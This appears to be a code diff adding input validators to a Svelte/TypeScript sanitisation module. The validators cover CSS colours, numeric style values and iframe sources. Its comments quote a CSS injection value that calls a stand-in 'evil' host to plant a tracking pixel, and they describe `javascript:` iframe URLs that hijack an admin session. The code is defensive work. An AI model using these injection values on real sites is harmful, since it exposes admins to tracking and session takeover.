@@ -87,3 +87,45 @@ export function safeHtml(html: unknown): string {
     ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|#|\/)/i,
   });
 }
+
+const CSS_COLOR_RE = /^(?:#[0-9a-f]{3,8}|rgba?\([^)]{0,80}\)|hsla?\([^)]{0,80}\)|[a-z]{3,20})$/i;
+
+/**
+ * Validate a user-supplied CSS colour before splicing it into an inline
+ * `style="..."` attribute.
+ *
+ * Svelte escapes the value for HTML, but not for CSS — inside `style` the
+ * grammar is CSS, and `;` starts a new declaration. So a block author writing
+ * `red; background-image: url(https://evil/track?id=1)` gets a tracking pixel
+ * that fires the moment an admin opens the preview, leaking their IP and the
+ * fact they viewed it. Anything that is not recognisably a colour is replaced
+ * by the caller's fallback.
+ */
+export function safeCssColor(value: unknown, fallback: string): string {
+  if (typeof value !== 'string') return fallback;
+  const trimmed = value.trim();
+  if (trimmed.length === 0 || trimmed.length > 100) return fallback;
+  return CSS_COLOR_RE.test(trimmed) ? trimmed : fallback;
+}
+
+/** Clamp a user-supplied number used in a style attribute, so it cannot carry CSS. */
+export function safeCssNumber(value: unknown, fallback: number, min: number, max: number): number {
+  const n = typeof value === 'number' ? value : Number.parseFloat(String(value ?? ''));
+  if (!Number.isFinite(n)) return fallback;
+  return Math.min(max, Math.max(min, n));
+}
+
+/**
+ * Restrict an `<iframe src>` to http(s).
+ *
+ * The embed block lets an author type a URL. Without this, `javascript:...`
+ * runs in the admin's origin the moment the preview renders — an editor-to-admin
+ * session takeover from a field that looks like a text input.
+ */
+export function safeIframeSrc(url: unknown): string {
+  if (typeof url !== 'string' || url.length === 0) return 'about:blank';
+  const trimmed = url.trim();
+  if (/^https?:\/\//i.test(trimmed)) return trimmed;
+  if (/^\/\//.test(trimmed)) return `https:${trimmed}`;
+  return 'about:blank';
+}
